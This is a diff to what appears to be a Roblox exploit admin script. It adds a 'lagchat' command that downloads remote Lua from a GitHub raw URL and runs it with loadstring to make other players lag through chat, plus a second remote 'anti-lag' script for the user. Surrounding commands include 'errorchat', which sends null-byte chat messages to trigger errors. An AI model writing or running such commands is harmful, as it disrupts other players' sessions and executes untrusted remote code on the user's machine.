@@ -8461,6 +8461,14 @@ AddCommand("antichatlog", {}, "blocks roblox from logging your chat", {}, functi
 	Utils.Notify(Caller, "AntiChatlog", "Enabled!")
 end)
 
+AddCommand("lagchat", {}, "makes people lag using chat", {}, function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/ChatLag.lua"))()
+
+--<Anti Lag For Yourself>--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLag.lua"))()
+end)
+
 AddCommand("errorchat", {}, "makes the chat error appear", {}, function()
 	for i=1,3 do 
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
